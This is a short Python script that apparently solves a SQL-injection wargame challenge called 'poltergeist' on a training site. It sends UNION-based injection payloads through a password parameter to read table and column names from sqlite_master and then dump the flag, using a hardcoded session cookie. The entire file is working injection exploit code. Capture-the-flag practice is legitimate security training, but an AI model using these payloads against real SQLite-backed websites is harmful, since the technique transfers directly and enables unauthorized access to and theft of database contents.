import requests
from bs4 import BeautifulSoup

url = "https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php?"
cookie = {'PHPSESSID':'p4mhk1f9tkh2cp0kk040fubh2u'}

def tbl_name_and_col_name():
    query = "pw=' union select sql from sqlite_master limit 1,1-- "
    res = requests.get(url=url+query, cookies=cookie)
    soup = BeautifulSoup(res.text, 'html.parser')
    h2 = str(soup.find_all('h2'))
    table_name = h2[25:len(h2)-33]
    column_name = h2[44:len(h2)-14]
    print("TABLE NAME : " + table_name)
    print("COLUMN NAME : " + column_name)
    return table_name, column_name

def get_flag(table_name, column_name):
    query = "pw=' union select {} from {}-- ".format(column_name,table_name)
    res = requests.get(url=url+query,cookies=cookie)
    soup = BeautifulSoup(res.text, 'html.parser')
    h2 = str(soup.find_all('h2'))
    flag = h2[11:len(h2)-6]
    print("FLAG : " + flag)

if __name__ == "__main__":
    table_name, column_name = tbl_name_and_col_name()
    get_flag(table_name, column_name)

